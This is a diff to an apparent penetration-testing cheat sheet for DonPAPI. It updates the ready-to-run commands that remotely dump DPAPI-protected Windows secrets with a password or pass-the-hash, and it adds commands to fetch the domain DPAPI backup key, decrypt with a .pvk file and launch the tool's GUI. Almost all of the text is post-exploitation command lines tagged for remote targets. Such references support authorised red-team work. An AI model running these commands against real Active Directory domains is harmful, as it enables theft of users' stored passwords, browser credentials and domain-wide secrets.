@@ -5,13 +5,19 @@
 ## DonPAPI - Dump all - pwd
 #plateform/linux #target/remote #cat/POSTEXPLOIT
 ```
-donpapi <domain>/<user>:<password>@<target> -o donpapi_res
+donpapi collect -u <user> -p '<password>' -d <domain> -t <target>
 ```
 
 ## DonPAPI - Dump all - hashes
 #plateform/linux #target/remote #cat/POSTEXPLOIT
 ```
-donpapi <domain>/<user>@<target> -R -o donpapi_res --hashes '<hashes>'
+donpapi collect -u <user> -d <domain> -H '<hashes>' -t <target>
+```
+
+## DonPAPI - Dump domain backup key
+#plateform/linux #target/remote #cat/POSTEXPLOIT
+```
+donpapi collect -u <user> -p '<password>' -d <domain> -t <target> --fetch-pvk
 ```
 
 ## Get Domain BackupKeys
@@ -24,7 +30,14 @@ dpapi.py backupkeys --export -t <domain>/<da_user>@<dc_ip> -hashes '<hashes>'
 
 #plateform/linux #target/remote #cat/POSTEXPLOIT
 ```
-donpapi -pvk domain_backupkey.pvk <domain>/<da_user>@<network_file> -R -o donpapi_res --hashes '<hashes>'
+donpapi collect --pvkfile domain_backupkey.pvk  -u <user> -p '<password>' -d <domain> -t <target> --hashes '<hashes>'
+```
+
+## DonPAPI - Start GUI
+
+#plateform/linux #target/remote #cat/POSTEXPLOIT
+```
+donpapi gui
 ```
 
 ## DonPAPI DB - Browser pwd not empty
